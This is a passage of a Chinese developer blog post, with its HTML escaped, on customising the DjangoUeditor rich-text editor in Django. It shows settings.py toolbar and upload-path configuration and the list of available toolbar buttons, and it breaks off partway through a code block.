&lt;p&gt;我们重点说说这个编辑器。之后会给出一些常见需求的定制化的方案，可能手法有些暴力。
国内的话，百度开源出来的Ueditor很赞，资料也挺全，反正我最近的项目都在用它。&lt;br /&gt;
别急着各种埋头配置啦，干活之前不妨先逛逛github，常常有惊喜哦～&lt;br /&gt;
搜索django ueditor，果然出来一个&lt;a href="https://github.com/zhangfisher/DjangoUeditor"&gt;DjangoUeditor&lt;/a&gt;，貌似人家都帮我们集成好了！！&lt;br /&gt;
按照说明，分分钟配置好，python manage.py runserver ...能用！！就这么简单！！ 
省下的时间陪你的妹子，看你书去吧。
github，你，值得拥有～&lt;/p&gt;
&lt;p&gt;好的，下面我们来说几个定制化问题：（挺常见的需求）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前两天在django技术群里帮一妹子（她非坚持说比我早毕业两年，应当喊姐姐。。）解决了些小问题，她之前使用TinyMCE，无法本地上传图片，我对TinyMCE不太熟，于是推荐DjangoUeditor给她，她觉得默认的功能按钮太少，想使用全功能的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个好办：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#settings.py&lt;/span&gt;
&lt;span class="n"&gt;UEDITOR_SETTINGS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;toolbars&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;testa&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fullscreen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;undo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;redo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;italic&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;underline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]],&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;testb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[[&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;italic&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;underline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
                &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;images_upload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;max_size&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;asd&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;scrawl_upload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;scrawlabc&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;容易看出我们应当在toolbars这里配置功能按钮，testa，testb是功能面板名称,可选的参数看这里&lt;a href="https://github.com/campaign/ueditor/blob/master/ueditor.config.js"&gt;ueditor.config.js&lt;/a&gt;，有这些：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fullscreen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;undo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;redo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;italic&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;underline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fontborder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;strikethrough&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;superscript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;subscript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;removeformat&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;formatmatch&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;autotypeset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blockquote&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pasteplain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;forecolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;backcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertorderedlist&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertunorderedlist&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;selectall&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;cleardoc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;rowspacingtop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rowspacingbottom&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;lineheight&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;customstyle&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;paragraph&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fontfamily&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fontsize&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;directionalityltr&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;directionalityrtl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;indent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;justifyleft&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;justifycenter&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;justifyright&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;justifyjustify&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;touppercase&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;tolowercase&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;unlink&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;anchor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imagenone&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imageleft&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imageright&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imagecenter&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;insertimage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;emotion&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;scrawl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertvideo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;music&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;map&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gmap&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertframe&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;insertcode&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;webapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pagebreak&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;background&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;horizontal&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;date&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;spechars&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;snapscreen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wordimage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;inserttable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;deletetable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertparagraphbeforetable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertrow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;deleterow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertcol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;deletecol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mergecells&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mergeright&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mergedown&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;splittocells&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;splittorows&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;splittocols&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;charts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;print&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;preview&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;searchreplace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;help&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;drafts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们把为toolbars添加一个mytoolbars,像这样&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;toolbars&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;testa&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fullscreen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;undo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;redo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;italic&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;underline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]],&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;testb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[[&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;italic&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;underline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]],&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;mytoolbars&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:[[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fullscreen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;source&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;undo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;redo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;bold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;italic&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;underline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fontborder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;strikethrough&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;superscript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;subscript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;removeformat&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;formatmatch&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;autotypeset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blockquote&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pasteplain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;forecolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;backcolor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertorderedlist&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertunorderedlist&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;selectall&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;cleardoc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;rowspacingtop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rowspacingbottom&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;lineheight&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;customstyle&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;paragraph&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fontfamily&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fontsize&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;directionalityltr&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;directionalityrtl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;indent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;justifyleft&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;justifycenter&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;justifyright&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;justifyjustify&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;touppercase&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;tolowercase&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;unlink&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;anchor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imagenone&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imageleft&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imageright&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;imagecenter&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;insertimage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;emotion&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;scrawl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertvideo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;music&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;map&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gmap&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertframe&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;insertcode&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;webapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pagebreak&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;background&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
